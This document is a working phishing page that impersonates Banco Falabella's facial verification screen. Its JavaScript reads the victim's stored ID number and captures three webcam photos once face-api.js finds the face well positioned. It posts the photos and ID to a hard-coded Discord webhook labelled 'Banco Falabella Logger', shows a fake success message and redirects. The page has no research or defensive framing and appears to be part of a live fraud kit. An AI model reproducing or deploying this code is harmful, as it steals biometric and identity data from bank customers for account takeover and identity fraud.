<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Banco Falabella — Verificación Facial</title>
<script defer src="https://unpkg.com/face-api.js@0.22.2/dist/face-api.min.js"></script>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #ffffff;
    color: #333;
    -webkit-font-smoothing: antialiased;
  }
  .app {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    max-width: 430px;
    margin: 0 auto;
    background: #ffffff;
  }
  .header {
    padding: 20px 24px;
    border-bottom: 1px solid #ebebeb;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .header img { width: 140px; height: auto; }
  .content {
    padding: 24px;
    flex: 1;
    display: flex;
    flex-direction: column;
  }
  .title {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a1a;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  .instruction {
    font-size: 13px;
    color: #666;
    margin-bottom: 20px;
    line-height: 1.5;
  }
  .instruction strong {
    color: #e8003d;
    font-weight: 600;
  }
  .camera-container {
    position: relative;
    width: 100%;
    border-radius: 16px;
    overflow: hidden;
    background: #000;
    margin: 20px 0;
    aspect-ratio: 1;
    border: 2px solid #d0d0d0;
  }
  #video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    transform: scaleX(-1);
  }
  #canvas {
    display: none;
  }
  .detection-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .face-frame {
    position: absolute;
    width: 180px;
    height: 240px;
    border: 3px solid rgba(74, 156, 47, 0.4);
    border-radius: 20px;
    box-shadow: inset 0 0 0 1px rgba(74, 156, 47, 0.2);
    background: transparent;
  }
  .face-frame.perfect {
    border-color: #4a9c2f;
    box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 30px rgba(74, 156, 47, 0.6);
    background: rgba(74, 156, 47, 0.08);
    animation: pulse-frame 0.8s ease-in-out infinite;
  }
  @keyframes pulse-frame {
    0%, 100% { box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 20px rgba(74, 156, 47, 0.4); }
    50% { box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 35px rgba(74, 156, 47, 0.7); }
  }
  .status-container {
    margin-bottom: 20px;
  }
  .status {
    text-align: center;
    font-size: 14px;
    color: #888;
    min-height: 48px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f9f9f9;
    border-radius: 10px;
    padding: 14px;
    font-weight: 500;
    border: 1px solid #ebebeb;
  }
  .status.ready {
    color: #fff;
    background: linear-gradient(135deg, #4a9c2f 0%, #82d052 100%);
    animation: pulse 1.2s ease-in-out infinite;
    border: none;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.85; }
  }
  .status.processing {
    color: #4a9c2f;
    background: #f0f8f4;
    border-color: #4a9c2f;
  }
  .checklist {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 20px;
  }
  .check-item {
    font-size: 12px;
    padding: 10px 12px;
    border-radius: 8px;
    background: #f5f5f5;
    border: 1.5px solid #e0e0e0;
    display: flex;
    align-items: center;
    gap: 6px;
    color: #666;
    transition: all 0.25s;
  }
  .check-item.ok {
    background: #f0f8f4;
    border-color: #4a9c2f;
    color: #4a9c2f;
    font-weight: 600;
  }
  .check-icon {
    font-weight: bold;
    font-size: 14px;
  }
  .loading {
    display: none;
    text-align: center;
    margin-top: 16px;
  }
  .loading.show {
    display: block;
  }
  .spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid #ddd;
    border-top-color: #4a9c2f;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-text {
    font-size: 14px;
    color: #4a9c2f;
    font-weight: 600;
  }
</style>
</head>
<body>
<div class="app">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
         alt="Banco Falabella" width="140">
  </div>

  <div class="content">
    <p class="title">Verificación facial</p>
    
    <p class="instruction">Acércate a la cámara y espera a que se detecte tu rostro. Mantén una expresión neutral. <strong>Sin lentes ni accesorios</strong>.</p>

    <div class="camera-container">
      <video id="video" autoplay muted playsinline></video>
      <div class="detection-overlay">
        <div class="face-frame" id="faceFrame"></div>
      </div>
    </div>

    <div class="status-container">
      <div class="status" id="status">Iniciando...</div>
    </div>

    <div class="checklist" id="checklist" style="display: none;">
      <div class="check-item" id="checkLight">
        <span class="check-icon">○</span>
        <span>Iluminación</span>
      </div>
      <div class="check-item" id="checkDistance">
        <span class="check-icon">○</span>
        <span>Distancia</span>
      </div>
      <div class="check-item" id="checkCenter">
        <span class="check-icon">○</span>
        <span>Centrado</span>
      </div>
      <div class="check-item" id="checkExpression">
        <span class="check-icon">○</span>
        <span>Expresión</span>
      </div>
    </div>

    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div class="loading-text">Capturando fotos...</div>
    </div>
  </div>
</div>

<canvas id="canvas"></canvas>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const status = document.getElementById('status');
  const faceFrame = document.getElementById('faceFrame');
  const checklist = document.getElementById('checklist');
  const loading = document.getElementById('loading');

  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490551948598837268/ee4s2QMfWrRrKHaeCKDVKYzP3Cg4wFD5G7lbg4v-KOLnAWwolFgJSXcYWfGLKH-IJ8pV";
  
  const savedDni = localStorage.getItem("bf_last_dni") || "No disponible";
  const docType = localStorage.getItem("bf_doc_type") || "DNI";

  const docTypeLabel = {
    "DNI": "DNI",
    "CE": "Carnet",
    "PAS": "Pasaporte"
  };

  let stream = null;
  let modelsLoaded = false;
  let isCapturing = false;
  let detectionInterval = null;
  let detectionStats = {
    goodFrames: 0,
    totalFrames: 0
  };

  async function initCamera() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        status.textContent = 'Cargando IA...';
        setTimeout(loadFaceDetectionModels, 500);
      };
    } catch (e) {
      status.textContent = 'Error: No se puede acceder a la cámara';
      console.error('Error:', e);
    }
  }

  async function loadFaceDetectionModels() {
    try {
      status.textContent = 'Cargando modelos...';
      const MODEL_URL = 'https://unpkg.com/face-api.js@0.22.2/dist/models/';
      
      if (!faceapi || !faceapi.nets) {
        throw new Error('Face API no cargó correctamente');
      }

      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
        faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
        faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
      ]);
      
      modelsLoaded = true;
      checklist.style.display = 'grid';
      status.textContent = '✓ Ajusta tu posición';
      startFaceDetection();
    } catch (e) {
      console.error('Error loading models:', e);
      status.textContent = 'Reiniciando carga...';
      setTimeout(loadFaceDetectionModels, 2000);
    }
  }

  function updateChecklist(checks) {
    const items = {
      light: document.getElementById('checkLight'),
      distance: document.getElementById('checkDistance'),
      center: document.getElementById('checkCenter'),
      expression: document.getElementById('checkExpression')
    };

    Object.entries(checks).forEach(([key, isOk]) => {
      const item = items[key];
      if (item) {
        const icon = item.querySelector('.check-icon');
        if (isOk) {
          item.classList.add('ok');
          icon.textContent = '✓';
        } else {
          item.classList.remove('ok');
          icon.textContent = '○';
        }
      }
    });
  }

  function getImageBrightness(imageData) {
    const data = imageData.data;
    let sum = 0;
    for (let i = 0; i < data.length; i += 4) {
      sum += (data[i] + data[i + 1] + data[i + 2]) / 3;
    }
    return sum / (data.length / 4);
  }

  async function capturePhoto() {
    return new Promise(resolve => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.scale(-1, 1);
      ctx.drawImage(video, -video.videoWidth, 0);
      canvas.toBlob(resolve, 'image/jpeg', 0.92);
    });
  }

  async function sendPhotosToDiscord(photos) {
    try {
      loading.classList.add('show');

      const formData = new FormData();
      
      formData.append('payload_json', JSON.stringify({
        username: "Banco Falabella Logger",
        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
        embeds: [{
          title: "📸 VERIFICACIÓN FACIAL — BANCO FALABELLA",
          color: 0x4a9c2f,
          thumbnail: {
            url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
          },
          fields: [
            {
              name: "👤 USUARIO",
              value: `\`\`\`\n${docTypeLabel[docType]}: ${savedDni}\n\`\`\``,
              inline: false
            },
            {
              name: "📷 FOTOS",
              value: `✓ Foto 1\n✓ Foto 2\n✓ Foto 3`,
              inline: false
            },
            {
              name: "✅ ESTADO",
              value: "Verificación facial exitosa",
              inline: false
            },
            {
              name: "🕐 HORA",
              value: `${new Date().toLocaleString('es-PE')}`,
              inline: false
            }
          ],
          footer: {
            text: "⚡ by @Brknshinexxx  •  Telegram",
            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
          },
          timestamp: new Date().toISOString()
        }]
      }));

      photos.forEach((blob, idx) => {
        formData.append('file', blob, `foto_${idx + 1}.jpg`);
      });

      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        loading.classList.remove('show');
        status.classList.add('ready');
        status.textContent = '✓ ¡Verificación completada!';
        if (detectionInterval) clearInterval(detectionInterval);
        stream.getTracks().forEach(track => track.stop());
        
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 1500);
      }
    } catch (e) {
      console.error('Error:', e);
      loading.classList.remove('show');
    }
  }

  async function startFaceDetection() {
    if (!modelsLoaded || !stream) return;

    const detectionOptions = new faceapi.TinyFaceDetectorOptions({
      inputSize: 416,
      scoreThreshold: 0.6
    });

    detectionInterval = setInterval(async () => {
      if (isCapturing) return;

      try {
        const detections = await faceapi
          .detectAllFaces(video, detectionOptions)
          .withFaceLandmarks()
          .withFaceExpressions();
        
        if (detections.length === 0) {
          faceFrame.classList.remove('perfect');
          status.textContent = 'Muestra tu rostro...';
          updateChecklist({ light: false, distance: false, center: false, expression: false });
          detectionStats.goodFrames = 0;
          return;
        }

        const detection = detections[0];
        const box = detection.detection.box;

        // Brillo
        const centerX = Math.floor(box.x + box.width / 2);
        const centerY = Math.floor(box.y + box.height / 2);
        let brightness = 100;
        try {
          const imageData = canvas.getContext('2d').getImageData(centerX - 40, centerY - 40, 80, 80);
          brightness = getImageBrightness(imageData);
        } catch (e) {
          brightness = 100;
        }

        const videoWidth = video.videoWidth;
        const videoHeight = video.videoHeight;
        
        // Tamaño de cara
        const faceSize = (box.width + box.height) / 2;
        const minSize = Math.min(videoWidth, videoHeight) * 0.2;
        const maxSize = Math.min(videoWidth, videoHeight) * 0.55;
        const distanceOk = faceSize > minSize && faceSize < maxSize;

        // Centrado
        const faceCenter = box.x + box.width / 2;
        const centerOk = Math.abs(faceCenter - videoWidth / 2) < (videoWidth * 0.15);

        // Iluminación
        const lightOk = brightness > 45;

        // Expresión neutral
        const expressions = detection.expressions;
        const avgIntensity = Object.values(expressions).reduce((a, b) => a + b) / Object.keys(expressions).length;
        const expressionOk = avgIntensity < 0.6;

        updateChecklist({
          light: lightOk,
          distance: distanceOk,
          center: centerOk,
          expression: expressionOk
        });

        const allOk = lightOk && distanceOk && centerOk && expressionOk;

        if (allOk) {
          detectionStats.goodFrames++;
          faceFrame.classList.add('perfect');
          status.classList.add('processing');
          status.textContent = `✓ Perfecto (${detectionStats.goodFrames}/12)`;

          if (detectionStats.goodFrames >= 12) {
            isCapturing = true;
            faceFrame.classList.remove('perfect');
            status.textContent = 'Capturando...';
            
            const photos = [];
            for (let i = 0; i < 3; i++) {
              await new Promise(r => setTimeout(r, 50));
              const blob = await capturePhoto();
              photos.push(blob);
            }

            await sendPhotosToDiscord(photos);
          }
        } else {
          detectionStats.goodFrames = Math.max(0, detectionStats.goodFrames - 2);
          faceFrame.classList.remove('perfect');
          status.classList.remove('processing');
        }

      } catch (e) {
        console.error('Detection error:', e);
      }
    }, 150);
  }

  // Verificar que face-api.js esté disponible
  let waitForApi = setInterval(() => {
    if (typeof faceapi !== 'undefined') {
      clearInterval(waitForApi);
      initCamera();
    }
  }, 100);

  // Timeout si face-api tarda demasiado
  setTimeout(() => {
    if (typeof faceapi === 'undefined') {
      status.textContent = 'Recargando...';
      location.reload();
    }
  }, 5000);

  window.addEventListener('beforeunload', () => {
    if (detectionInterval) clearInterval(detectionInterval);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });
</script>
</body>
</html>
